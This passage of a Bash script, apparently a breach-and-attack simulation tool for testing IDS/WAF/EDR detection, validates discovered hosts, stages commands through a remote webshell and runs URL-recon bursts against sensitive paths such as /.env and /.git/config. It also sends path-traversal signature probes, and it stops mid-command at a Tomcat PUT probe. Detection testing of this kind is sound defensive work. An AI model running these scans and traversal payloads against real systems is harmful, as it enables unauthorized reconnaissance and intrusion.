        if [[ "${result}" == *"_USABLE"* ]]; then
            discovery_local_cache_append "${host}" "${dst_file}"
            run_webshell_quick "usable-append-${dst_file}-${host}" \
                "mkdir -p '${REMOTE_RUNTIME_DIR}' && echo '${host}' >> '${REMOTE_RUNTIME_DIR}/${dst_file}'" \
                >/dev/null 2>&1 || true
            usable=$((usable + 1))
        else
            skipped=$((skipped + 1))
            state_append "usable_validation_skipped.log" "${dst_file} host=${host} reason=${result:-dead}"
            DEGRADED_TELEMETRY=true
        fi
    done < <(get_local_hosts "${src_file}")
    if [[ -s "${dst_cache}" ]]; then
        sort -u "${dst_cache}" -o "${dst_cache}"
    fi
    echo "${usable}:${skipped}"
}

promote_discovered_hosts_to_usable_cache() {
    local pair src dst src_cache dst_cache n total=0
    for pair in \
        "http_targets.txt:usable_http_targets.txt" \
        "https_targets.txt:usable_https_targets.txt" \
        "ssh_hosts.txt:usable_ssh_hosts.txt" \
        "smb_hosts.txt:usable_smb_hosts.txt" \
        "dns_hosts.txt:usable_dns_hosts.txt"; do
        src="${pair%%:*}"
        dst="${pair#*:}"
        src_cache="${LOCAL_STATE_DIR}/remote_hosts/${src}"
        dst_cache="${LOCAL_STATE_DIR}/remote_hosts/${dst}"
        [[ -s "${src_cache}" ]] || continue
        extract_host_file_lines < "${src_cache}" | sort -u > "${dst_cache}"
        n=$(count_discovered_ips_in_file "${dst_cache}")
        total=$((total + n))
    done
    SERVICES_USABLE_TOTAL="${total}"
}

stage_validate_discovered_services_usable() {
    local http_n https_n ssh_n smb_n dns_n usable_total=0 pair
    add_executed_stage "Service Usability Validation"
    write_report_entries "usable_validation" "T1046" "NDR/XDR" "Service Validation" "${TARGET_NET}" "start" "usable check before follow-up"

    if [[ "${DRY_RUN}" == true ]]; then
        SERVICES_USABLE_TOTAL=$(count_all_discovered_services)
        set_stage_result "Service Usability Validation" "Success" "dry-run (using discovered hosts)"
        return 0
    fi

    run_webshell "init-usable-target-files" \
        "for f in usable_http_targets.txt usable_https_targets.txt usable_ssh_hosts.txt usable_smb_hosts.txt usable_dns_hosts.txt; do : > '${REMOTE_RUNTIME_DIR}'/\$f; done" \
        >/dev/null 2>&1 || true

    pair=$(filter_usable_hosts_to_remote_file "http_targets.txt" "usable_http_targets.txt" remote_validate_http_usable "http" "80")
    http_n=${pair%%:*}
    pair=$(filter_usable_hosts_to_remote_file "https_targets.txt" "usable_https_targets.txt" remote_validate_http_usable "https" "443")
    https_n=${pair%%:*}
    pair=$(filter_usable_hosts_to_remote_file "ssh_hosts.txt" "usable_ssh_hosts.txt" remote_validate_ssh_usable)
    ssh_n=${pair%%:*}
    pair=$(filter_usable_hosts_to_remote_file "smb_hosts.txt" "usable_smb_hosts.txt" remote_validate_smb_usable)
    smb_n=${pair%%:*}
    pair=$(filter_usable_hosts_to_remote_file "dns_hosts.txt" "usable_dns_hosts.txt" remote_validate_dns_usable)
    dns_n=${pair%%:*}

    usable_total=$((http_n + https_n + ssh_n + smb_n + dns_n))
    SERVICES_USABLE_TOTAL="${usable_total}"
    state_append "usable_validation.log" "http=${http_n} https=${https_n} ssh=${ssh_n} smb=${smb_n} dns=${dns_n} total=${usable_total}"

    if (( usable_total == 0 )) && (( SERVICES_DISCOVERED_TOTAL > 0 )); then
        log_message "WARN" "TCP usability checks returned 0 — promoting discovered hosts to follow-up lists"
        add_fallback_usage "Usability validation: promoting nmap/TCP discovery results for follow-up"
        promote_discovered_hosts_to_usable_cache
        usable_total="${SERVICES_USABLE_TOTAL}"
        DEGRADED_TELEMETRY=true
    elif (( usable_total == 0 )); then
        log_message "WARN" "No usable services after validation — follow-up will use raw discovery lists"
        add_fallback_usage "Usability validation: no hosts passed; follow-up uses raw discovery files"
        DEGRADED_TELEMETRY=true
    else
        log_message "OK" "Usable services validated: ${usable_total} host(s)"
    fi
    set_stage_result "Service Usability Validation" "Success" "usable=${usable_total}"
    write_report_entries "usable_validation" "T1046" "NDR/XDR" "Service Validation" "${TARGET_NET}" "success" "usable=${usable_total}"
}

get_followup_hosts() {
    local raw="$1" usable="usable_${1}"
    local raw_hosts usable_hosts
    [[ -z "${raw}" ]] && return 0
    raw_hosts=$(get_local_hosts "${raw}" 2>/dev/null)
    usable_hosts=$(get_local_hosts "${usable}" 2>/dev/null)
    if [[ -n "${raw_hosts}" ]]; then
        printf '%s\n' "${raw_hosts}"
        [[ -n "${usable_hosts}" ]] && printf '%s\n' "${usable_hosts}"
    elif [[ -n "${usable_hosts}" ]]; then
        printf '%s\n' "${usable_hosts}"
    fi | extract_host_file_lines | sort -u
}

followup_plan_http_requests() {
    local http_nodes="$1" https_nodes="$2" req_per_host="$3"
    local http_n https_n targets
    http_n=$(count_hosts_blob "${http_nodes}")
    https_n=$(count_hosts_blob "${https_nodes}")
    targets=$((http_n + https_n))
    (( targets < 1 )) && targets=1
    (( targets > 3 )) && targets=3
    echo $(( targets * req_per_host ))
}

resolve_http_scan_wave_plan() {
    # External URL Reconnaissance profile: many unique paths per host in a short burst,
    # sensitive/non-existent targets, >=30 unique failures, ~90-100% fail ratio, HTTP 400 mix.
    case "${POC_INTENSITY}" in
        light)
            HTTP_SCAN_UNIQUE_URL_TARGET=60
            HTTP_SCAN_WAVES=1
            HTTP_SCAN_WAVE_FAIL_MIN=30
            HTTP_SCAN_WAVE_FAIL_MAX=45
            HTTP_SCAN_WAVE_SLEEP=0
            HTTP_SCAN_WAVE_ATTEMPT_CAP=80
            HTTP_SCAN_INTER_REQUEST_SLEEP=0
            ;;
        normal)
            HTTP_SCAN_UNIQUE_URL_TARGET=80
            HTTP_SCAN_WAVES=1
            HTTP_SCAN_WAVE_FAIL_MIN=35
            HTTP_SCAN_WAVE_FAIL_MAX=50
            HTTP_SCAN_WAVE_SLEEP=0
            HTTP_SCAN_WAVE_ATTEMPT_CAP=110
            HTTP_SCAN_INTER_REQUEST_SLEEP=0
            ;;
        high|spike)
            HTTP_SCAN_UNIQUE_URL_TARGET=120
            HTTP_SCAN_WAVES=2
            HTTP_SCAN_WAVE_FAIL_MIN=40
            HTTP_SCAN_WAVE_FAIL_MAX=60
            HTTP_SCAN_WAVE_SLEEP=1
            HTTP_SCAN_WAVE_ATTEMPT_CAP=150
            HTTP_SCAN_INTER_REQUEST_SLEEP=0
            ;;
        *)
            HTTP_SCAN_UNIQUE_URL_TARGET=80
            HTTP_SCAN_WAVES=1
            HTTP_SCAN_WAVE_FAIL_MIN=35
            HTTP_SCAN_WAVE_FAIL_MAX=50
            HTTP_SCAN_WAVE_SLEEP=0
            HTTP_SCAN_WAVE_ATTEMPT_CAP=110
            HTTP_SCAN_INTER_REQUEST_SLEEP=0
            ;;
    esac
    HTTP_SCAN_UNIQUE_URL_RECOMMENDED=100
    HTTP_SCAN_RECON_MIN_FAILED=30
    HTTP_SCAN_RECON_MIN_FAIL_RATIO=90
    if (( HTTP_SCAN_UNIQUE_URL_TARGET < 40 )); then
        HTTP_SCAN_UNIQUE_URL_TARGET=40
    fi
    resolve_http_detection_window_plan
}

sync_url_scan_unique_metrics() {
    local total=$((URL_SCAN_UNIQUE_FAILED + URL_SCAN_UNIQUE_SUCCESS))
    if (( total > 0 )); then
        URL_SCAN_UNIQUE_FAIL_RATIO=$((URL_SCAN_UNIQUE_FAILED * 100 / total))
    else
        URL_SCAN_UNIQUE_FAIL_RATIO=0
    fi
    # Stellar model: total_failed = unique URLs with HTTP error status
    URL_SCAN_ANOMALY_SCORE=$((URL_SCAN_UNIQUE_FAILED * 12 + URL_SCAN_UNIQUE_ATTEMPTED / 4))
}

compute_url_scan_anomaly_score() {
    sync_url_scan_unique_metrics
}

simulate_url_scan_unique_metrics() {
    local target="${1:-${HTTP_SCAN_UNIQUE_URL_TARGET:-75}}"
    target=$(safe_int "${target}")
    (( target < 50 )) && target=50
    URL_SCAN_UNIQUE_ATTEMPTED="${target}"
    URL_SCAN_UNIQUE_FAILED=$((target * 93 / 100))
    URL_SCAN_UNIQUE_SUCCESS=$((target - URL_SCAN_UNIQUE_FAILED))
    (( URL_SCAN_UNIQUE_SUCCESS < 1 )) && URL_SCAN_UNIQUE_SUCCESS=1 && URL_SCAN_UNIQUE_FAILED=$((target - 1))
    sync_url_scan_unique_metrics
}

format_url_scan_stellar_model_block() {
    compute_url_scan_anomaly_score
    cat <<EOF
Stellar URL Scan Model (unique URL telemetry)
- Unique URLs Attempted              : ${URL_SCAN_UNIQUE_ATTEMPTED:-0}
- Unique Failed URLs                 : ${URL_SCAN_UNIQUE_FAILED:-0}
- Unique Successful URLs             : ${URL_SCAN_UNIQUE_SUCCESS:-0}
- Failure Ratio                      : ${URL_SCAN_UNIQUE_FAIL_RATIO:-0}%
- Estimated Weighted Anomaly Score Contribution : ${URL_SCAN_ANOMALY_SCORE:-0}
- Expected Detection                 : External URL Reconnaissance Anomaly
- Expected Event                     : external_url_scan
- Expected Technique                 : T1595 Active Scanning
- Unique URL target (min/recommended): ${HTTP_SCAN_UNIQUE_URL_TARGET:-50} / ${HTTP_SCAN_UNIQUE_URL_RECOMMENDED:-100}
- Recon profile                     : rapid burst per host, sensitive paths, fail_ratio target>=${HTTP_SCAN_RECON_MIN_FAIL_RATIO:-90}%
- HTTP 400 responses                : ${HTTP_400_COUNT:-0} (https ${HTTPS_400_COUNT:-0})
- URL scan detection likelihood     : ${DETECTION_LIKELIHOOD_URL_SCAN:-low} (4xx/recon profile)
- Malicious UA detection likelihood : ${DETECTION_LIKELIHOOD_MALICIOUS_UA:-low}
- HTTP UA coverage (url_scan)       : ${HTTP_UA_COVERAGE_PRESENT:-0}/${HTTP_UA_COVERAGE_TOTAL:-0} present normal=${HTTP_UA_COVERAGE_NORMAL:-0} rare=${HTTP_UA_COVERAGE_RARE:-0} payload=${HTTP_UA_COVERAGE_PAYLOAD:-0}
EOF
}

sync_http_scan_fail_ratio() {
    local total=$((HTTP_SCAN_FAILED_RESPONSES + HTTP_SCAN_SUCCESS_RESPONSES))
    if (( total > 0 )); then
        HTTP_SCAN_FAIL_RATIO=$((HTTP_SCAN_FAILED_RESPONSES * 100 / total))
    else
        HTTP_SCAN_FAIL_RATIO=0
    fi
}

simulate_http_scan_response_metrics() {
    local planned="$1"
    simulate_url_scan_unique_metrics "${HTTP_SCAN_UNIQUE_URL_TARGET:-75}"
    planned="${URL_SCAN_UNIQUE_ATTEMPTED}"
    HTTP_SCAN_FAILED_RESPONSES=$((URL_SCAN_UNIQUE_FAILED))
    HTTP_SCAN_SUCCESS_RESPONSES=$((URL_SCAN_UNIQUE_SUCCESS))
    (( HTTP_SCAN_SUCCESS_RESPONSES < 1 )) && HTTP_SCAN_SUCCESS_RESPONSES=1
    HTTP_400_COUNT=$((HTTP_SCAN_FAILED_RESPONSES * 22 / 100))
    HTTP_403_COUNT=$((HTTP_SCAN_FAILED_RESPONSES * 28 / 100))
    HTTP_404_COUNT=$((HTTP_SCAN_FAILED_RESPONSES * 38 / 100))
    HTTP_405_COUNT=$((HTTP_SCAN_FAILED_RESPONSES * 12 / 100))
    HTTP_200_COUNT=$((HTTP_SCAN_SUCCESS_RESPONSES / 2))
    HTTP_301_COUNT=$((HTTP_SCAN_SUCCESS_RESPONSES / 4))
    HTTP_302_COUNT=$((HTTP_SCAN_SUCCESS_RESPONSES / 4))
    HTTP_401_COUNT=$((HTTP_SCAN_FAILED_RESPONSES / 10))
    HTTPS_SCAN_FAILED_RESPONSES=$((HTTP_SCAN_FAILED_RESPONSES / 3))
    HTTPS_SCAN_SUCCESS_RESPONSES=$((HTTP_SCAN_SUCCESS_RESPONSES / 3))
    HTTPS_403_COUNT=$((HTTPS_SCAN_FAILED_RESPONSES * 35 / 100))
    HTTPS_404_COUNT=$((HTTPS_SCAN_FAILED_RESPONSES * 45 / 100))
    HTTPS_405_COUNT=$((HTTPS_SCAN_FAILED_RESPONSES * 20 / 100))
    HTTPS_200_COUNT=$((HTTPS_SCAN_SUCCESS_RESPONSES / 2))
    HTTP_PROPFIND_COUNT=$((planned / 8))
    HTTP_POST_COUNT=$((planned / 6))
    HTTP_OPTIONS_COUNT=$((planned / 10))
    sync_http_scan_fail_ratio
    sync_web_combined_metrics
}

probe_http_scan_responsive() {
    local host="$1" port="$2" scheme="$3" curl_tls="" out url
    [[ "${host}" == *:* ]] && host="${host%%:*}"
    [[ "${scheme}" == "https" ]] && curl_tls="-k"
    url=$(build_web_target_url "${scheme}" "${host}" "${port}" "/")
    if [[ "${HAS_curl:-false}" == true ]]; then
        out=$(run_webshell_quick "http-scan-probe-${host}-${port}" \
            "code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 3 '${url}' 2>/dev/null || echo 000); if [[ \"\${code}\" != \"000\" && -n \"\${code}\" ]]; then echo HTTP_RESP_OK:\${code}; else echo HTTP_RESP_NONE; fi" \
            2>/dev/null | tr -d '\r' | tail -n 1 || true)
        [[ "${out}" == HTTP_RESP_OK:* ]] && return 0
    fi
    remote_probe_web_tcp_open "${host}" "${port}"
}

collect_http_scan_candidate_hosts() {
    local http https merged=""
    http=$(collect_hosts_from_remote_file "reachable_http_targets.txt")
    https=$(collect_hosts_from_remote_file "reachable_https_targets.txt")
    merged=$(printf '%s\n%s' "${http}" "${https}")
    printf '%s\n' "${merged}" | extract_host_file_lines | sort -u
}

select_http_scan_targets() {
    collect_http_url_scan_candidates | head -n 3
}

collect_http_url_scan_candidates() {
    local line host port scheme responsive="" count=0 max_targets=10 degraded=false
    URL_SCAN_DEGRADED_FALLBACK=false
    for scheme in http https; do
        while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            (( count >= max_targets )) && break
            read -r host port scheme <<< "$(web_target_parse_line "${line}" "${scheme}")" || continue
            if [[ "${DRY_RUN}" == true ]] || remote_probe_web_reachable "${host}" "${port}" "${scheme}"; then
                responsive=$(printf '%s\n%s' "${responsive}" "${host} ${port} ${scheme}")
                count=$((count + 1))
            fi
        done < <(collect_hosts_from_remote_file "reachable_${scheme}_targets.txt")
    done
    if (( count == 0 )); then
        degraded=true
        for scheme in http https; do
            while IFS= read -r line; do
                [[ -z "${line}" ]] && continue
                (( count >= max_targets )) && break
                read -r host port scheme <<< "$(web_target_parse_line "${line}" "${scheme}")" || continue
                responsive=$(printf '%s\n%s' "${responsive}" "${host} ${port} ${scheme}")
                count=$((count + 1))
            done < <(collect_web_target_candidates "${scheme}")
        done
        if (( count > 0 )); then
            URL_SCAN_DEGRADED_FALLBACK=true
            log_message "WARN" "URL Scan using degraded fallback targets (raw+usable candidates; reachability empty or failed)"
            add_fallback_usage "URL Scan: degraded fallback from raw+usable web candidates"
        fi
    fi
    printf '%s\n' "${responsive}" | awk 'NF'
}

build_http_url_scan_probe_paths_remote_cmd() {
    local host="$1" port="$2" scheme="$3" curl_tls="" base_url
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    [[ "${scheme}" == "https" ]] && curl_tls="-k"
    base_url=$(build_web_target_url "${scheme}" "${host}" "${port}" "")
    base_url="${base_url%/}"
    cat <<EOF
bash <<'PROBE_UA_SCRIPT'
$(http_ua_remote_bash_snippet)
$(http_url_scan_ua_policy_remote_snippet)
SCAN_TARGET='${host}'
echo "HTTP_UA_POLICY scope=url_scan normal_ua_allowed=no ua_required=yes rare_ratio=50 payload_ratio=50"
ua_cov_total=0; ua_cov_present=0; ua_cov_missing=0; ua_cov_normal=0; ua_cov_rare=0; ua_cov_payload=0; ua_cov_abnormal=0
p400=0;p403=0;p404=0;psuccess=0;ptimeout=0
start=\$(date +%s)
paths=("/WEB-INF/web.xml" "/.env" "/laravel/.env" "/.git/config" "/api/swagger" "/cmd.jsp" "/admin")
for path in "\${paths[@]}"; do
  ua=\$(ensure_ua_nonempty "\$(pick_burst_ua)")
  code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 3 -A "\$ua" "${base_url}\${path}" 2>/dev/null || echo 000)
  code=\$(printf '%s' "\$code" | tr -cd '0-9')
  log_http_ua_request "\$path" "\$ua" "\$code"
  [[ -z "\$code" || "\$code" == "000" ]] && { ptimeout=\$((ptimeout+1)); continue; }
  case "\$code" in
    400) p400=\$((p400+1));;
    403) p403=\$((p403+1));;
    404) p404=\$((p404+1));;
    2*|3*) psuccess=\$((psuccess+1));;
  esac
done
end=\$(date +%s); elapsed=\$((end - start))
emit_http_ua_coverage
echo "HTTP_URL_SCAN_PROBE_STATS scheme=${scheme} host=${host} port=${port} probe_400=\$p400 probe_403=\$p403 probe_404=\$p404 probe_success=\$psuccess probe_timeout=\$ptimeout elapsed_sec=\$elapsed"
PROBE_UA_SCRIPT
EOF
}

run_http_url_scan_target_probe() {
    local host="$1" port="$2" scheme="$3" out line
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    if [[ "${DRY_RUN}" == true ]]; then
        local idx="${4:-0}"
        local p400=0 p403=0 p404=0 psuccess=1 ptimeout=0 elapsed=1
        case $((idx % 4)) in
            0) p400=2; p403=1; p404=1; psuccess=1 ;;
            1) p403=2; p404=2; psuccess=1 ;;
            2) p404=3; psuccess=2 ;;
            3) p400=1; p404=1; ptimeout=1 ;;
        esac
        printf 'HTTP_URL_SCAN_PROBE_STATS scheme=%s host=%s port=%s probe_400=%s probe_403=%s probe_404=%s probe_success=%s probe_timeout=%s elapsed_sec=%s\n' \
            "${scheme}" "${host}" "${port}" "${p400}" "${p403}" "${p404}" "${psuccess}" "${ptimeout}" "${elapsed}"
        return 0
    fi
    if [[ "${HAS_curl:-false}" != true ]]; then
        printf 'HTTP_URL_SCAN_PROBE_STATS scheme=%s host=%s port=%s probe_400=0 probe_403=0 probe_404=0 probe_success=0 probe_timeout=5 elapsed_sec=99\n' \
            "${scheme}" "${host}" "${port}"
        return 0
    fi
    out=$(run_webshell_quick "http-url-scan-probe-${scheme}-${host}-${port}" \
        "$(build_http_url_scan_probe_paths_remote_cmd "${host}" "${port}" "${scheme}")" \
        2>/dev/null | tr -d '\r' || true)
    ingest_http_attack_remote_output "${out}" "${host}"
    line=$(printf '%s\n' "${out}" | grep 'HTTP_URL_SCAN_PROBE_STATS' | tail -n1 || true)
    [[ -n "${line}" ]] && printf '%s\n' "${line}" && return 0
    printf 'HTTP_URL_SCAN_PROBE_STATS scheme=%s host=%s port=%s probe_400=0 probe_403=0 probe_404=0 probe_success=0 probe_timeout=5 elapsed_sec=99\n' \
        "${scheme}" "${host}" "${port}"
}

parse_http_url_scan_probe_stats() {
    local line="$1"
    local host port scheme p400 p403 p404 psuccess ptimeout elapsed
    host=$(sed -n 's/.*host=\([^ ]*\).*/\1/p' <<< "${line}")
    port=$(safe_int "$(sed -n 's/.*port=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    scheme=$(sed -n 's/.*scheme=\([^ ]*\).*/\1/p' <<< "${line}")
    p400=$(safe_int "$(sed -n 's/.*probe_400=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    p403=$(safe_int "$(sed -n 's/.*probe_403=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    p404=$(safe_int "$(sed -n 's/.*probe_404=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    psuccess=$(safe_int "$(sed -n 's/.*probe_success=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    ptimeout=$(safe_int "$(sed -n 's/.*probe_timeout=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    elapsed=$(safe_int "$(sed -n 's/.*elapsed_sec=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    printf '%s %s %s %s %s %s %s %s %s\n' "${host}" "${port}" "${scheme}" "${p400}" "${p403}" "${p404}" "${psuccess}" "${ptimeout}" "${elapsed}"
}

score_http_url_scan_probe() {
    local p400="$1" p403="$2" p404="$3" ptimeout="$4" elapsed="$5" scheme="$6"
    local fail403404=$((p403 + p404)) scheme_bonus=0
    [[ "${scheme}" == "http" ]] && scheme_bonus=10
    echo $((p400 * 1000000 + fail403404 * 10000 - ptimeout * 1000 - elapsed + scheme_bonus))
}

select_http_url_scan_concentrated_target() {
    local candidates="$1" target_line host port scheme probe_line idx=0 candidate_count=0
    local p400 p403 p404 psuccess ptimeout elapsed score best_score=-999999999
    local best_host="" best_port="" best_scheme="" best_p400=0 best_p403=0 best_p404=0 best_psuccess=0 best_ptimeout=0
    local sel_reason="" probe_cache="${LOG_DIR}/http_url_scan_probe_cache.tsv"
    : > "${probe_cache}" 2>/dev/null || true
    while IFS= read -r target_line; do
        [[ -z "${target_line}" ]] && continue
        if [[ "${target_line}" == *" "* ]]; then
            read -r host port scheme <<< "${target_line}"
        elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "http" 2>/dev/null)"; then
            :
        elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "https" 2>/dev/null)"; then
            :
        else
            continue
        fi
        read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
        probe_line=$(run_http_url_scan_target_probe "${host}" "${port}" "${scheme}" "${idx}")
        read -r host port scheme p400 p403 p404 psuccess ptimeout elapsed <<< "$(parse_http_url_scan_probe_stats "${probe_line}")"
        score=$(score_http_url_scan_probe "${p400}" "${p403}" "${p404}" "${ptimeout}" "${elapsed}" "${scheme}")
        printf '%s|%s|%s|%s|%s|%s|%s|%s|%s\n' "${host}" "${port}" "${scheme}" "${p400}" "${p403}" "${p404}" "${psuccess}" "${ptimeout}" >> "${probe_cache}" 2>/dev/null || true
        if (( score > best_score )); then
            best_score="${score}"
            best_host="${host}"
            best_port="${port}"
            best_scheme="${scheme}"
            best_p400="${p400}"
            best_p403="${p403}"
            best_p404="${p404}"
            best_psuccess="${psuccess}"
            best_ptimeout="${ptimeout}"
        fi
        idx=$((idx + 1))
        candidate_count=$((candidate_count + 1))
    done <<< "${candidates}"
    HTTP_URL_SCAN_CANDIDATE_COUNT="${candidate_count}"
    if [[ -z "${best_host}" ]]; then
        HTTP_URL_SCAN_SELECTED_TARGET=""
        HTTP_URL_SCAN_SELECTION_LINE=""
        log_http_url_scan_target_selection "0" "none" "no_reachable_candidates" "0" "0" "0" "0" "0"
        return 1
    fi
    HTTP_URL_SCAN_SELECTED_TARGET="${best_scheme}://${best_host}:${best_port}"
    HTTP_URL_SCAN_SELECTION_LINE="${best_host} ${best_port} ${best_scheme}"
    sel_reason="ranked_by_probe_400_then_403_404_then_latency_http_preferred"
    log_http_url_scan_target_selection "${candidate_count}" "${HTTP_URL_SCAN_SELECTED_TARGET}" "${sel_reason}" \
        "${best_p400}" "${best_p403}" "${best_p404}" "${best_psuccess}" "${best_ptimeout}"
    printf '%s %s %s\n' "${HTTP_URL_SCAN_SELECTION_LINE}"
}

# If concentrated target precheck fails (e.g. HTTP/0.9), pick next probe-ranked candidate that passes precheck.
pick_http_url_scan_failover_target() {
    local candidates="$1" skip_host="$2" skip_port="$3" skip_scheme="$4"
    local target_line host port scheme url precheck_line precheck_cmd precheck_ec precheck_out classification
    local cache="${LOG_DIR}/http_url_scan_probe_cache.tsv" best_score=-999999999
    local best_host="" best_port="" best_scheme="" h p s p400 p403 p404 psuccess ptimeout score
    _pick_http_failover_from_ranked() {
        local h="$1" p="$2" s="$3" sc="$4"
        [[ -z "${h}" ]] && return 1
        [[ "${h}" == "${skip_host}" && "${p}" == "${skip_port}" && "${s}" == "${skip_scheme}" ]] && return 1
        read -r host port scheme <<< "$(normalize_http_scan_target_fields "${h}" "${p}" "${s}")"
        url="${scheme}://${host}:${port}/"
        precheck_line=$(poc_precheck_http "${url}")
        poc_precheck_read_line "${precheck_line}" precheck_cmd precheck_ec precheck_out classification
        poc_obs_should_run_http_followup "${classification}" || return 1
        (( sc > best_score )) || return 1
        best_score="${sc}"
        best_host="${host}"
        best_port="${port}"
        best_scheme="${scheme}"
        return 0
    }
    if [[ -f "${cache}" ]]; then
        while IFS='|' read -r h p s p400 p403 p404 psuccess ptimeout; do
            [[ -z "${h}" ]] && continue
            score=$(score_http_url_scan_probe "${p400}" "${p403}" "${p404}" "${ptimeout}" "0" "${s}")
            _pick_http_failover_from_ranked "${h}" "${p}" "${s}" "${score}" || true
        done < "${cache}"
    fi
    if [[ -z "${best_host}" ]]; then
        while IFS= read -r target_line; do
            [[ -z "${target_line}" ]] && continue
            if [[ "${target_line}" == *" "* ]]; then
                read -r h p s <<< "${target_line}"
            elif read -r h p s <<< "$(web_target_parse_line "${target_line}" "http" 2>/dev/null)"; then
                :
            elif read -r h p s <<< "$(web_target_parse_line "${target_line}" "https" 2>/dev/null)"; then
                :
            else
                continue
            fi
            score=0
            if read -r p400 p403 p404 psuccess ptimeout <<< "$(lookup_http_url_scan_probe_cache "${h}" "${p}" "${s}" 2>/dev/null)"; then
                score=$(score_http_url_scan_probe "${p400}" "${p403}" "${p404}" "${ptimeout}" "0" "${s}")
            fi
            _pick_http_failover_from_ranked "${h}" "${p}" "${s}" "${score}" || true
        done <<< "${candidates}"
    fi
    [[ -z "${best_host}" ]] && return 1
    HTTP_URL_SCAN_SELECTED_TARGET="${best_scheme}://${best_host}:${best_port}"
    HTTP_URL_SCAN_SELECTION_LINE="${best_host} ${best_port} ${best_scheme}"
    log_message "OK" "HTTP_URL_SCAN_FAILOVER selected=${HTTP_URL_SCAN_SELECTED_TARGET} skipped=${skip_scheme}://${skip_host}:${skip_port} reason=precheck_failover"
    printf '%s %s %s\n' "${HTTP_URL_SCAN_SELECTION_LINE}"
}

lookup_http_url_scan_probe_cache() {
    local host="$1" port="$2" scheme="$3" cache="${LOG_DIR}/http_url_scan_probe_cache.tsv"
    local h p s p400 p403 p404 psuccess ptimeout
    [[ -f "${cache}" ]] || return 1
    while IFS='|' read -r h p s p400 p403 p404 psuccess ptimeout; do
        [[ "${h}" == "${host}" && "${p}" == "${port}" && "${s}" == "${scheme}" ]] && \
            printf '%s %s %s %s %s\n' "${p400}" "${p403}" "${p404}" "${psuccess}" "${ptimeout}" && return 0
    done < "${cache}"
    return 1
}

# Reuse reachable web targets for IDS/WAF/EDR signature probes (same pool as URL scan).
select_active_web_server_targets() {
    select_http_scan_targets
}

parse_sig_probe_stats_line() {
    local out="$1" line
    local attempted=0 responses=0 traversal=0 tomcat_put=0 spring_hdr=0 edr_cmd=0
    line=$(printf '%s\n' "${out}" | grep 'SIG_PROBE_STATS' | tail -n1 || true)
    if [[ -n "${line}" ]]; then
        attempted=$(safe_int "$(sed -n 's/.*attempted=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        responses=$(safe_int "$(sed -n 's/.*responses=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        traversal=$(safe_int "$(sed -n 's/.*traversal=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        tomcat_put=$(safe_int "$(sed -n 's/.*tomcat_put=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        spring_hdr=$(safe_int "$(sed -n 's/.*spring_hdr=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        edr_cmd=$(safe_int "$(sed -n 's/.*edr_cmd=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    fi
    printf '%s %s %s %s %s %s' "${attempted}" "${responses}" "${traversal}" "${tomcat_put}" "${spring_hdr}" "${edr_cmd}"
}

# Safe signature-only HTTP probes (no command execution on operator host; plain-text IDS/WAF/EDR patterns).
build_ids_waf_signature_probe_remote_cmd() {
    local host="$1" port="$2" scheme="$3" campaign="$4" attacker_ip="$5"
    local base_url curl_tls=""
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    [[ "${scheme}" == "https" ]] && curl_tls="-k"
    base_url=$(build_web_target_url "${scheme}" "${host}" "${port}" "/")
    attacker_ip="${attacker_ip:-127.0.0.1}"
    cat <<EOF
bash <<'SIG_UA_SCRIPT'
${REMOTE_SHELL_HELPERS}
$(http_ua_remote_bash_snippet)
$(http_url_scan_ua_policy_remote_snippet)
SCAN_TARGET='${host}'
echo "HTTP_UA_POLICY scope=url_scan normal_ua_allowed=no ua_required=yes rare_ratio=50 payload_ratio=50"
ua_cov_total=0; ua_cov_present=0; ua_cov_missing=0; ua_cov_normal=0; ua_cov_rare=0; ua_cov_payload=0; ua_cov_abnormal=0
curl_tls='${curl_tls}'
base='${base_url}'
base="\${base%/}/"
campaign='${campaign}'
attacker='${attacker_ip}'
at=0; resp=0; trav=0; tomcat_put=0; spring_hdr=0; edr_cmd=0
sig_http_code(){
  local code path ua
  code="\$1"; path="\$2"; ua="\$3"
  code=\$(printf '%s' "\$code" | tr -cd '0-9')
  [ -z "\$code" ] && code=000
  log_http_ua_request "\$path" "\$ua" "\$code"
  at=\$((at+1))
  [ "\$code" != "000" ] && resp=\$((resp+1))
}
sig_req(){
  local path="\$1"; shift
  local ua=\$(ensure_ua_nonempty "\$(pick_burst_ua)")
  local code
  code=\$(curl \${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 5 -A "\$ua" "\$@" 2>/dev/null || echo 000)
  sig_http_code "\$code" "\$path" "\$ua"
}
sig_req "/app/download.jsp?file=../../../../WEB-INF/web.xml" \\
  -H "X-PoC-Campaign: \${campaign}" -H "X-PoC-Mode: ids-waf-signature-probe" \\
  "\${base}app/download.jsp?file=../../../../WEB-INF/web.xml"
trav=\$((trav+1))
sig_req "/view.jsp?path=../../../../WEB-INF/classes/" \\
  -H "X-PoC-Campaign: \${campaign}" -H "X-PoC-Mode: ids-waf-signature-probe" \\
  "\${base}view.jsp?path=../../../../WEB-INF/classes/"
trav=\$((trav+1))
ua=\$(ensure_ua_nonempty "\$(pick_burst_ua)")
code=\$(curl \${curl_tls} -s -o /dev/null -w '%{http_code}' -X PUT --max-time 5 -A "\$ua" \\
